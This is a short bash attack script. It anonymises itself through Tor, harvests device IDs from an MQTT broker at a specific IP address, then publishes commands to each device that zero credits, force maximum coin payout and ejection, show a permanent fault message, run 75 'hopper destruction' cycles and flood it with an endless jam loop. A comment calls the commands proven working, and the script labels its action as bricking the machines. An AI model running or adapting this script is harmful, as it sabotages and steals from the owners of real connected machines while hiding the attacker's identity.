torsocks mosquitto_sub -h 188.14.144.138 -p 1883 -t '#' -v -C 30 | grep -oE '([893][0-9a-f]{19})' | sort -u | while read MAC; do
  echo "BRICKING $MAC";
  
  # PROVEN WORKING (copia dal tuo log):
  torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/o/$MAC" -m '{"credits":0,"drop":"MAXIMUM","hopper":"EMPTY"}';
  torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/k/$MAC" -m '{"payout":"MAX","eject":true}';
  torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/display/$MAC" -m '{"display":"HARDWARE FAULT","neon":1,"permanent":true}';
  
  # 75x HOPPER DESTRUCTION CYCLES
  for i in {1..75}; do
    torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/o/$MAC" -m "{\"drop\":\"MAX\",\"coins\":99999999,\"cycle\":$i}";
  done;
  
  # INFINITE JAM
  while true; do torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/o/$MAC" -m '{}'; done &
done &
